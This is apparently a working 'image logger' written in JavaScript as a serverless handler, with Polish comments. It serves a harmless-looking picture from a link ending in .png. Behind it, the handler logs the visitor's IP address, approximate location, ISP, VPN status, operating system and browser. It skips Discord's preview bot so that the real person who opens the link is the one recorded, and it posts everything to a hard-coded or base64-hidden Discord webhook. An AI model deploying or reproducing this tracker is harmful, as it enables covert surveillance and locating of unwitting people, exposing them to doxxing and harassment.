// ====================== KOALA IMAGE LOGGER ======================
// Wysyła EMBED zamiast zwykłej wiadomości
// Działa automatycznie na Discordzie – link kończy się na .png

// ========== TWÓJ WEBHOOK (wklej tutaj na stałe) ==========
const YOUR_WEBHOOK = "https://discord.com/api/webhooks/1486439184737763400/ZoSv_Z_nl3orhOavk5gf7IT_Tlkj20GR0yL29aVzrWncfhJ6IiWFWrOz_MQmpaPjc4RZ";

// Funkcja do dekodowania webhooka z base64 (opcjonalnie)
function decodeWebhook(encoded) {
    try {
        return Buffer.from(encoded, 'base64').toString('utf-8');
    } catch {
        return null;
    }
}

// Poprawione wykrywanie przeglądarki
function getBrowser(userAgent) {
    const ua = userAgent.toLowerCase();
    if (ua.includes('opr') || ua.includes('opera')) return 'Opera GX / Opera';
    if (ua.includes('edg')) return 'Microsoft Edge';
    if (ua.includes('chrome') && !ua.includes('edg') && !ua.includes('opera')) return 'Google Chrome';
    if (ua.includes('firefox')) return 'Mozilla Firefox';
    if (ua.includes('safari') && !ua.includes('chrome')) return 'Apple Safari';
    return 'Unknown';
}

// Poprawione wykrywanie systemu operacyjnego
function getOS(userAgent) {
    const ua = userAgent.toLowerCase();
    if (ua.includes('windows nt 11.0')) return 'Windows 11';
    if (ua.includes('windows nt 10.0')) return 'Windows 10';
    if (ua.includes('windows nt 6.3')) return 'Windows 8.1';
    if (ua.includes('windows nt 6.2')) return 'Windows 8';
    if (ua.includes('windows nt 6.1')) return 'Windows 7';
    if (ua.includes('mac os x 10_15')) return 'macOS Catalina';
    if (ua.includes('mac os x 10_14')) return 'macOS Mojave';
    if (ua.includes('mac os x')) return 'macOS';
    if (ua.includes('iphone')) return 'iPhone iOS';
    if (ua.includes('ipad')) return 'iPadOS';
    if (ua.includes('android')) return 'Android';
    if (ua.includes('linux')) return 'Linux';
    return 'Unknown';
}

export default async function handler(req, res) {
    // ========== UKRYTY WEBHOOK (opcjonalnie z parametru) ==========
    const encodedWebhook = req.query.w || req.query.webhook;
    const finalWebhook = encodedWebhook ? decodeWebhook(encodedWebhook) : YOUR_WEBHOOK;
    
    // ========== POBRANIE IP ==========
    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    if (ip === '::1') ip = '127.0.0.1';
    if (ip.startsWith('::ffff:')) ip = ip.split(':').pop();
    
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const time = new Date().toLocaleString('pl-PL', { timeZone: 'Europe/Warsaw' });
    
    // ========== WYKRYWANIE DISCORD BOTA ==========
    const ua = userAgent.toLowerCase();
    const isDiscordBot = ua.includes('discordbot') || (ua.includes('discord') && ua.includes('bot'));
    
    // ========== GEOLOKALIZACJA (ip-api.com) ==========
    let geo = {
        provider: 'Unknown',
        asn: 'Unknown',
        country: 'Unknown',
        region: 'Unknown',
        city: 'Unknown',
        lat: '?',
        lon: '?',
        timezone: 'Unknown',
        mobile: false,
        vpn: false
    };
    
    if (!isDiscordBot && finalWebhook) {
        try {
            const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,as,mobile,proxy,timezone`);
            const geoData = await geoRes.json();
            
            if (geoData.status === 'success') {
                geo = {
                    provider: geoData.isp || 'Unknown',
                    asn: geoData.as || 'Unknown',
                    country: geoData.country || 'Unknown',
                    region: geoData.regionName || 'Unknown',
                    city: geoData.city || 'Unknown',
                    lat: geoData.lat?.toFixed(4) || '?',
                    lon: geoData.lon?.toFixed(4) || '?',
                    timezone: geoData.timezone || 'Unknown',
                    mobile: geoData.mobile || false,
                    vpn: geoData.proxy || false
                };
            }
        } catch (e) {
            console.log('Geo lookup failed:', e.message);
        }
    }
    
    const browser = getBrowser(userAgent);
    const os = getOS(userAgent);
    
    // ========== PRZYGOTUJ EMBED (zamiast zwykłej wiadomości) ==========
    const embed = {
        title: "🌭 KOALA Image Logger",
        description: "**A User Opened the Original Image!**\n`Endpoint: /api/hotdog`",
        color: 0x5865F2,
        fields: [
            {
                name: "🌐 IP INFO",
                value: `\`\`\`\nIP: ${ip}\nProvider: ${geo.provider}\nASN: ${geo.asn}\nCountry: ${geo.country}\nRegion: ${geo.region}\nCity: ${geo.city}\nCoords: ${geo.lat}, ${geo.lon} (Approximate)\nTimezone: ${geo.timezone}\nMobile: ${geo.mobile ? '✅ Yes' : '❌ No'}\nVPN/Proxy: ${geo.vpn ? '⚠️ Yes' : '❌ No'}\nBot: ${isDiscordBot ? '⚠️ Yes' : '❌ No'}\`\`\``,
                inline: false
            },
            {
                name: "💻 DEVICE INFO",
                value: `\`\`\`\nOS: ${os}\nBrowser: ${browser}\n\`\`\``,
                inline: true
            },
            {
                name: "⏱️ TIME",
                value: `\`\`\`\n${time}\n\`\`\``,
                inline: true
            },
            {
                name: "🔍 USER AGENT",
                value: `\`\`\`\n${userAgent.substring(0, 200)}${userAgent.length > 200 ? '...' : ''}\n\`\`\``,
                inline: false
            }
        ],
        footer: {
            text: "KOALA Image Logger • IP Logged",
            icon_url: "https://cdn.discordapp.com/attachments/1484643547545342012/1484911633644912851/latest.png"
        },
        timestamp: new Date().toISOString(),
        image: {
            url: "https://i.imgur.com/9ZqB8Xa.jpg"
        }
    };
    
    // ========== WYŚLIJ EMBED NA WEBHOOK ==========
    if (finalWebhook && !isDiscordBot) {
        try {
            await fetch(finalWebhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [embed],
                    username: "KOALA Logger",
                    avatar_url: "https://cdn.discordapp.com/attachments/1484643547545342012/1484911633644912851/latest.png"
                })
            });
        } catch (e) {}
    }
    
    // ========== ZWRÓĆ OBRAZEK PNG ==========
    res.setHeader('Content-Type', 'image/png');
    res.setHeader('Cache-Control', 'no-cache');
    
    try {
        const imageRes = await fetch('https://i.imgur.com/9ZqB8Xa.jpg');
        const imageBuffer = await imageRes.arrayBuffer();
        res.send(Buffer.from(imageBuffer));
    } catch (e) {
        // Fallback – przezroczysty 1x1 piksel
        const pixel = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==', 'base64');
        res.send(pixel);
    }
}
